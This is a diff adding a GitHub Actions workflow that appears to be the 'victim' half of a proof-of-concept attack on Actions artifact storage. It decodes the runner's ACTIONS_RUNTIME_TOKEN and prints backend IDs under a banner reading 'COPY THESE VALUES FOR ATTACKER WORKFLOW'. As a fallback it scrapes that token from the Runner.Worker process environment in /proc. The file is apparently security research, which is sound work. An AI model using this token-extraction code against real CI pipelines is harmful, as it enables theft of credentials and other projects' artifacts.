@@ -1,0 +1,61 @@
+name: Victim - Extract Backend IDs
+on: workflow_dispatch
+jobs:
+  victim:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create and upload artifact
+        run: echo "VICTIM_SECRET_$(date +%s)" > secret.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: victim-secret-artifact
+          path: secret.txt
+      - name: Extract backend IDs from runtime token
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // Method 1: ACTIONS_RUNTIME_TOKEN env
+            const token = process.env['ACTIONS_RUNTIME_TOKEN'];
+            if (token) {
+              const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString());
+              core.info('=== VICTIM JWT CLAIMS ===');
+              core.info('scp: ' + claims.scp);
+              
+              // Parse backend IDs from scp
+              const scpParts = claims.scp.split(' ');
+              const resultsClaim = scpParts.find(s => s.startsWith('Actions.Results:'));
+              if (resultsClaim) {
+                const ids = resultsClaim.split(':');
+                core.info('');
+                core.info('========================================');
+                core.info('COPY THESE VALUES FOR ATTACKER WORKFLOW:');
+                core.info('========================================');
+                core.info('VICTIM_BACKEND_ID_1=' + ids[1]);
+                core.info('VICTIM_BACKEND_ID_2=' + ids[2]);
+                core.info('========================================');
+              }
+              
+              core.info('');
+              core.info('ACTIONS_RESULTS_URL=' + (process.env['ACTIONS_RESULTS_URL'] || 'not set'));
+              core.info('ACTIONS_RUNTIME_URL=' + (process.env['ACTIONS_RUNTIME_URL'] || 'not set'));
+            } else {
+              // Method 2: extract from Runner.Worker process
+              const { execSync } = require('child_process');
+              try {
+                const env = execSync("cat /proc/$(pgrep -f Runner.Worker)/environ 2>/dev/null | tr '\\0' '\\n' | grep ACTIONS_RUNTIME_TOKEN= | cut -d= -f2-", { encoding: 'utf8' }).trim();
+                if (env) {
+                  const claims = JSON.parse(Buffer.from(env.split('.')[1], 'base64').toString());
+                  core.info('=== VICTIM JWT CLAIMS (from /proc) ===');
+                  core.info('scp: ' + claims.scp);
+                  const scpParts = claims.scp.split(' ');
+                  const resultsClaim = scpParts.find(s => s.startsWith('Actions.Results:'));
+                  if (resultsClaim) {
+                    const ids = resultsClaim.split(':');
+                    core.info('VICTIM_BACKEND_ID_1=' + ids[1]);
+                    core.info('VICTIM_BACKEND_ID_2=' + ids[2]);
+                  }
+                }
+              } catch(e) {
+                core.info('Failed to extract token: ' + e.message);
+              }
+            }
